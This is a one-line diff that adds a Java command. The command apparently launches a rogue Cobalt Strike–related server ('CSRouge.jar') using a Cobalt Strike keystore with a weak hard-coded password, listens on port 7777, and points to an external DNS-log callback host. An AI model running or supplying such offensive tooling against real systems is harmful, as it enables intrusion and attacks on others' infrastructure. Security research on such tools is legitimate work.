@@ -1,0 +1,1 @@
+java -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -jar CSRouge.jar 7777 http://dnslog.dnslog
